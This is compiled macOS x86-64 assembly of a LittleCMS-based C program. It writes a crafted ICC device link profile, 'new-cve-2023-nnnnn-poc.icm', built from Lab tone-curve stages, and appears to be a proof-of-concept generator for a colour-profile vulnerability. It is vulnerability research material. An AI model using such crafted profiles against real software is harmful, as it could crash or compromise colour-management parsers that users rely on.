	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 13, 0	sdk_version 13, 3
	.section	__TEXT,__literal8,8byte_literals
	.p2align	3                               ## -- Begin function main
LCPI0_0:
	.quad	0x4010cccccccccccd              ## double 4.2000000000000002
	.section	__TEXT,__text,regular,pure_instructions
	.globl	_main
	.p2align	4, 0x90
_main:                                  ## @main
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$96, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -36(%rbp)
	movl	%edi, -40(%rbp)
	movq	%rsi, -48(%rbp)
	movq	___stderrp@GOTPCREL(%rip), %rax
	movq	(%rax), %rdi
	leaq	L_.str(%rip), %rsi
	movb	$0, %al
	callq	_fprintf
	leaq	L_.str.1(%rip), %rdi
	callq	_remove
	leaq	L_.str.1(%rip), %rdi
	leaq	L_.str.2(%rip), %rsi
	callq	_cmsOpenProfileFromFile
	movq	%rax, -56(%rbp)
	callq	_CreateLinear
	movq	%rax, -72(%rbp)
	callq	_CreateStep
	movq	%rax, -80(%rbp)
	movq	-72(%rbp), %rax
	movq	%rax, -32(%rbp)
	movq	-80(%rbp), %rax
	movq	%rax, -24(%rbp)
	movq	-80(%rbp), %rax
	movq	%rax, -16(%rbp)
	xorl	%eax, %eax
	movl	%eax, %edi
	movl	$3, %edx
	movl	%edx, %esi
	callq	_cmsPipelineAlloc
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	movq	%rax, -88(%rbp)                 ## 8-byte Spill
	leaq	-32(%rbp), %rdx
	xorl	%eax, %eax
	movl	%eax, %edi
	movl	$3, %esi
	callq	_cmsStageAllocToneCurves
	movq	-88(%rbp), %rdi                 ## 8-byte Reload
	movq	%rax, %rdx
	xorl	%esi, %esi
	callq	_cmsPipelineInsertStage
	movq	-56(%rbp), %rdi
	movl	$1281450528, %esi               ## imm = 0x4C616220
	callq	_cmsSetColorSpace
	movq	-56(%rbp), %rdi
	movl	$1281450528, %esi               ## imm = 0x4C616220
	callq	_cmsSetPCS
	movq	-56(%rbp), %rdi
	movl	$1818848875, %esi               ## imm = 0x6C696E6B
	callq	_cmsSetDeviceClass
	movq	-56(%rbp), %rdi
	movsd	LCPI0_0(%rip), %xmm0            ## xmm0 = mem[0],zero
	callq	_cmsSetProfileVersion
	movq	-56(%rbp), %rdi
	movq	-64(%rbp), %rdx
	movl	$1093812785, %esi               ## imm = 0x41324231
	callq	_cmsWriteTag
	movq	-56(%rbp), %rdi
	callq	_SetTextTags
	movq	-56(%rbp), %rdi
	callq	_cmsCloseProfile
	movq	-72(%rbp), %rdi
	callq	_cmsFreeToneCurve
	movq	-80(%rbp), %rdi
	callq	_cmsFreeToneCurve
	movq	-64(%rbp), %rdi
	callq	_cmsPipelineFree
	movq	___stderrp@GOTPCREL(%rip), %rax
	movq	(%rax), %rdi
	leaq	L_.str.3(%rip), %rsi
	movb	$0, %al
	callq	_fprintf
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB0_2
## %bb.1:
	xorl	%eax, %eax
	addq	$96, %rsp
	popq	%rbp
	retq
LBB0_2:
	callq	___stack_chk_fail
	ud2
	.cfi_endproc
                                        ## -- End function
	.p2align	4, 0x90                         ## -- Begin function CreateLinear
_CreateLinear:                          ## @CreateLinear
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$16, %rsp
	movl	L___const.CreateLinear.Linear(%rip), %eax
	movl	%eax, -4(%rbp)
	leaq	-4(%rbp), %rdx
	xorl	%eax, %eax
	movl	%eax, %edi
	movl	$2, %esi
	callq	_cmsBuildTabulatedToneCurve16
	addq	$16, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__literal8,8byte_literals
	.p2align	3                               ## -- Begin function CreateStep
LCPI2_0:
	.quad	0x406fe00000000000              ## double 255
LCPI2_1:
	.quad	0x40affe0000000000              ## double 4095
LCPI2_2:
	.quad	0x4070100000000000              ## double 257
LCPI2_3:
	.quad	0x3fe0000000000000              ## double 0.5
	.section	__TEXT,__text,regular,pure_instructions
	.p2align	4, 0x90
_CreateStep:                            ## @CreateStep
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$48, %rsp
	movl	$4096, %edi                     ## imm = 0x1000
	movl	$2, %esi
	callq	_calloc
	movq	%rax, -24(%rbp)
	cmpq	$0, -24(%rbp)
	jne	LBB2_2
## %bb.1:
	movq	$0, -8(%rbp)
	jmp	LBB2_7
LBB2_2:
	movl	$0, -28(%rbp)
LBB2_3:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$4096, -28(%rbp)                ## imm = 0x1000
	jge	LBB2_6
## %bb.4:                               ##   in Loop: Header=BB2_3 Depth=1
	cvtsi2sdl	-28(%rbp), %xmm0
	movsd	LCPI2_0(%rip), %xmm1            ## xmm1 = mem[0],zero
	mulsd	%xmm1, %xmm0
	movsd	LCPI2_1(%rip), %xmm1            ## xmm1 = mem[0],zero
	divsd	%xmm1, %xmm0
	movsd	%xmm0, -40(%rbp)
	movsd	-40(%rbp), %xmm0                ## xmm0 = mem[0],zero
	callq	_DecodeAbTIFF
	movsd	%xmm0, -40(%rbp)
	movsd	-40(%rbp), %xmm0                ## xmm0 = mem[0],zero
	movsd	LCPI2_2(%rip), %xmm1            ## xmm1 = mem[0],zero
	mulsd	%xmm1, %xmm0
	movsd	LCPI2_3(%rip), %xmm1            ## xmm1 = mem[0],zero
	addsd	%xmm1, %xmm0
	roundsd	$9, %xmm0, %xmm0
	cvttsd2si	%xmm0, %eax
	movw	%ax, %dx
	movq	-24(%rbp), %rax
	movslq	-28(%rbp), %rcx
	movw	%dx, (%rax,%rcx,2)
## %bb.5:                               ##   in Loop: Header=BB2_3 Depth=1
	movl	-28(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -28(%rbp)
	jmp	LBB2_3
LBB2_6:
	movq	-24(%rbp), %rdx
	xorl	%eax, %eax
	movl	%eax, %edi
	movl	$4096, %esi                     ## imm = 0x1000
	callq	_cmsBuildTabulatedToneCurve16
	movq	%rax, -16(%rbp)
	movq	-24(%rbp), %rdi
	callq	_free
	movq	-16(%rbp), %rax
	movq	%rax, -8(%rbp)
LBB2_7:
	movq	-8(%rbp), %rax
	addq	$48, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.p2align	4, 0x90                         ## -- Begin function SetTextTags
_SetTextTags:                           ## @SetTextTags
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$32, %rsp
	movq	%rdi, -8(%rbp)
	movl	$0, -28(%rbp)
	xorl	%eax, %eax
	movl	%eax, %edi
	movl	$1, %esi
	callq	_cmsMLUalloc
	movq	%rax, -16(%rbp)
	xorl	%eax, %eax
	movl	%eax, %edi
	movl	$1, %esi
	callq	_cmsMLUalloc
	movq	%rax, -24(%rbp)
	cmpq	$0, -16(%rbp)
	je	LBB3_2
## %bb.1:
	cmpq	$0, -24(%rbp)
	jne	LBB3_3
LBB3_2:
	jmp	LBB3_12
LBB3_3:
	movq	-16(%rbp), %rdi
	leaq	L_.str.4(%rip), %rsi
	leaq	L_.str.5(%rip), %rdx
	leaq	L_.str.6(%rip), %rcx
	callq	_cmsMLUsetASCII
	cmpl	$0, %eax
	jne	LBB3_5
## %bb.4:
	jmp	LBB3_12
LBB3_5:
	movq	-24(%rbp), %rdi
	leaq	L_.str.4(%rip), %rsi
	leaq	L_.str.5(%rip), %rdx
	leaq	L_.str.7(%rip), %rcx
	callq	_cmsMLUsetASCII
	cmpl	$0, %eax
	jne	LBB3_7
## %bb.6:
	jmp	LBB3_12
LBB3_7:
	movq	-8(%rbp), %rdi
	movq	-16(%rbp), %rdx
	movl	$1684370275, %esi               ## imm = 0x64657363
	callq	_cmsWriteTag
	cmpl	$0, %eax
	jne	LBB3_9
## %bb.8:
	jmp	LBB3_12
LBB3_9:
	movq	-8(%rbp), %rdi
	movq	-24(%rbp), %rdx
	movl	$1668313716, %esi               ## imm = 0x63707274
	callq	_cmsWriteTag
	cmpl	$0, %eax
	jne	LBB3_11
## %bb.10:
	jmp	LBB3_12
LBB3_11:
	movl	$1, -28(%rbp)
LBB3_12:
	cmpq	$0, -16(%rbp)
	je	LBB3_14
## %bb.13:
	movq	-16(%rbp), %rdi
	callq	_cmsMLUfree
LBB3_14:
	cmpq	$0, -24(%rbp)
	je	LBB3_16
## %bb.15:
	movq	-24(%rbp), %rdi
	callq	_cmsMLUfree
LBB3_16:
	movl	-28(%rbp), %eax
	addq	$32, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__literal8,8byte_literals
	.p2align	3                               ## -- Begin function DecodeAbTIFF
LCPI4_0:
	.quad	0x4060000000000000              ## double 128
LCPI4_1:
	.quad	0x405fc00000000000              ## double 127
	.section	__TEXT,__text,regular,pure_instructions
	.p2align	4, 0x90
_DecodeAbTIFF:                          ## @DecodeAbTIFF
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movsd	%xmm0, -8(%rbp)
	movsd	LCPI4_0(%rip), %xmm0            ## xmm0 = mem[0],zero
	ucomisd	-8(%rbp), %xmm0
	jb	LBB4_2
## %bb.1:
	movsd	LCPI4_1(%rip), %xmm0            ## xmm0 = mem[0],zero
	addsd	-8(%rbp), %xmm0
	movsd	%xmm0, -8(%rbp)
	jmp	LBB4_3
LBB4_2:
	movsd	-8(%rbp), %xmm0                 ## xmm0 = mem[0],zero
	movsd	LCPI4_1(%rip), %xmm1            ## xmm1 = mem[0],zero
	subsd	%xmm1, %xmm0
	movsd	%xmm0, -8(%rbp)
LBB4_3:
	movsd	-8(%rbp), %xmm0                 ## xmm0 = mem[0],zero
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"Creating new-cve-2023-nnnnn-poc.icm..."

L_.str.1:                               ## @.str.1
	.asciz	"new-cve-2023-nnnnn-poc.icm"

L_.str.2:                               ## @.str.2
	.asciz	"w"

L_.str.3:                               ## @.str.3
	.asciz	"Done.\n"

	.section	__TEXT,__literal4,4byte_literals
	.p2align	1                               ## @__const.CreateLinear.Linear
L___const.CreateLinear.Linear:
	.short	0                               ## 0x0
	.short	65535                           ## 0xffff

	.section	__TEXT,__cstring,cstring_literals
L_.str.4:                               ## @.str.4
	.asciz	"en"

L_.str.5:                               ## @.str.5
	.asciz	"US"

L_.str.6:                               ## @.str.6
	.asciz	"David H Hoyt LLC 2023"

L_.str.7:                               ## @.str.7
	.asciz	"Copyright (c) David H Hoyt LLC, 2023. All rights reserved."

.subsections_via_symbols
